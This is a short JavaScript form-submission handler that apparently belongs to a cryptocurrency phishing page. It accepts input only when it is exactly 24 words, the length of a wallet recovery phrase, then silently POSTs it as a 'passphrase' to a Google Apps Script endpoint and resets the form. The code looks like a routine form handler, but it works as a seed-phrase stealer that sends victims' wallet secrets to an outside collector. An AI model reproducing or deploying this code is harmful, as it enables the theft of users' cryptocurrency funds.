// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission

    const myButton = document.getElementById('b1');
    myButton.disabled = true;

    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Google Apps Script Web App URL
    const url = "https://script.google.com/macros/s/AKfycbzDAQMdqfEC-sUMlK05t_6fCQCV6xi7F6Co9fPQno6jCly0nDnpHD88NyWR7-_pfi24/exec";

    // Make a POST request
    fetch(url, {
        method: "POST",
        mode: "cors", // Ensures CORS support
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ passphrase: inputValue })
    })
    .then(response => response.json())
    .then(data => {
        console.log("Success:", data);
    })
    .catch(error => {
        console.error("Error:", error);
    });

    myButton.disabled = false;
    myButton2.disabled = false;
    form.reset();
}



